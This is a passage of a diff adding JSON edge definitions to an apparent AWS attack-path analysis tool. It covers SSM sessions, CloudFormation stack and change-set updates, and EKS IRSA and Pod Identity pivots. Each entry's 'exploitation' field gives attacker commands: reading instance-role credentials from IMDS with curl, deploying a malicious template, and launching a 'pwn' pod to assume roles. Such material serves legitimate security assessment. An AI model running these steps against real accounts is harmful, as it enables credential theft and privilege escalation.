+    "description": "The source can call ssm:StartSession against the target managed instance, opening an interactive shell on it (as ssm-user / root via Session Manager). This is hands-on-keyboard access to the instance, and the path continues into the instance profile role through AWS_RunsAs.",
+    "required_edges": [],
+    "exploitation": "1. Open an interactive session (requires the Session Manager plugin locally):\n     aws --profile <attacker-profile> ssm start-session --target <instance-id>\n2. In the shell, read the instance profile role's credentials from IMDS:\n     curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/\n3. Use those credentials to act as the instance profile role."
+  },
+  "AWS_CanUpdateCloudFormationStack": {
+    "description": "The source can call cloudformation:UpdateStack on the target stack. CloudFormation applies the rewritten template using the stack's service role (RoleARN), so the attacker can have it create or modify resources as that role — code/permission execution as the stack role. The edge only resolves for stacks that have a RoleARN, and the path continues into that role through AWS_RunsAs (no iam:PassRole needed; the stack's existing role is reused).",
+    "required_edges": [],
+    "exploitation": "1. Author a template that grants you access as the stack role, e.g. an IAM user/role with admin, or an instance that exfiltrates credentials.\n2. Update the stack with it (the stack already has a RoleARN, so no PassRole is required):\n     aws --profile <attacker-profile> cloudformation update-stack --stack-name <stack-name> --template-body file://evil.yaml --capabilities CAPABILITY_NAMED_IAM\n3. Wait for the update to complete:\n     aws --profile <attacker-profile> cloudformation wait stack-update-complete --stack-name <stack-name>\n4. Use the resources/credentials your template created — you now act with the stack role's privileges."
+  },
+  "AWS_CanExecuteCloudFormationChangeSet": {
+    "description": "Composite edge: the source holds BOTH cloudformation:CreateChangeSet and cloudformation:ExecuteChangeSet on the target stack. This is the change-set route to the same outcome as UpdateStack — stage a rewritten template as a change set, then execute it — and CloudFormation applies it using the stack's RoleARN with no iam:PassRole. Only resolves for stacks with a RoleARN; the path continues into that role through AWS_RunsAs. Computed from raw permissions, so it has no pre-existing constituent graph edges.",
+    "required_edges": [],
+    "exploitation": "1. Stage a malicious template as a change set on the existing stack:\n     aws --profile <attacker-profile> cloudformation create-change-set --stack-name <stack-name> --change-set-name x --template-body file://evil.yaml --capabilities CAPABILITY_NAMED_IAM\n2. Wait for it to be created, then execute it (applied as the stack RoleARN):\n     aws --profile <attacker-profile> cloudformation wait change-set-create-complete --stack-name <stack-name> --change-set-name x\n     aws --profile <attacker-profile> cloudformation execute-change-set --stack-name <stack-name> --change-set-name x\n3. Use the resources/credentials the template created — you now act with the stack role's privileges."
+  },
+  "AWS_CanAssumeRoleViaIRSA": {
+    "description": "A cluster administrator can obtain the target role through IAM Roles for Service Accounts (IRSA). The role's trust policy trusts the cluster's OIDC provider for a service account, so a pod run with that service account receives a projected web-identity token and can assume the role. Cluster control is therefore a pivot into the role.",
+    "required_edges": [],
+    "exploitation": "1. With cluster access, identify (or create) the Kubernetes service account the role's trust policy names (eks.amazonaws.com/role-arn annotation), then run a pod using it:\n     aws --profile <attacker-profile> eks update-kubeconfig --name <cluster-name> --region <region>\n     kubectl run pwn --image=amazonlinux --overrides='{\"spec\":{\"serviceAccountName\":\"<mapped-sa>\"}}' -it -- bash\n2. Inside the pod, the AWS SDK auto-assumes the role using the projected token at $AWS_WEB_IDENTITY_TOKEN_FILE; or do it manually:\n     aws sts assume-role-with-web-identity --role-arn <target-role-arn> --role-session-name s --web-identity-token $(cat $AWS_WEB_IDENTITY_TOKEN_FILE)\n3. Act as the role."
+  },
+  "AWS_CanAssumeRoleViaPodIdentity": {
+    "description": "A cluster administrator can obtain the target role through an EKS Pod Identity association that already binds a service account to the role. A pod launched with that service account is handed the role's credentials automatically by the Pod Identity Agent, so cluster control is a pivot into the role.",
+    "required_edges": [],
+    "exploitation": "1. With cluster access, find the service account bound to the role (aws eks list-pod-identity-associations --cluster-name <cluster-name>) and run a pod using it:\n     aws --profile <attacker-profile> eks update-kubeconfig --name <cluster-name> --region <region>\n     kubectl run pwn --image=amazonlinux --overrides='{\"spec\":{\"serviceAccountName\":\"<mapped-sa>\"}}' -it -- bash\n2. Inside the pod, the role's credentials are delivered via the Pod Identity Agent (AWS_CONTAINER_CREDENTIALS_FULL_URI); the AWS SDK uses them automatically.\n3. Act as the role."
+  }
+}
